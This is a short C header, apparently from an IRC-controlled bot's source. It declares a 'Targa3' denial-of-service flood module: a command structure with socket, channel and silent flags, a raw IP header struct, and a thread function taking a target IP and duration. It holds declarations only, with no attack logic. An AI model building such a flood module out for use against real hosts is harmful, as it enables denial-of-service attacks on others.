#ifndef NO_TARGA3
typedef struct TARGA3 {

	SOCKET sock;
	char ip[128];
	char length[128];
	char chan[128];
	int threadnum;
	BOOL notice;
	BOOL silent;
	BOOL gotinfo;

} TARGA3;

struct iph
{
	unsigned char ihl:4;
	unsigned char version:4;
	unsigned char tos;
	unsigned short int tot_len;
	unsigned short int id;
	unsigned short int frag_off;
	unsigned char ttl;
	unsigned char protocol;
	unsigned short int check;
	unsigned int saddr;
	unsigned int daddr;
};

DWORD WINAPI Targa3Thread(LPVOID param);
int Targa3(unsigned long TargetIP, int time);
#endif
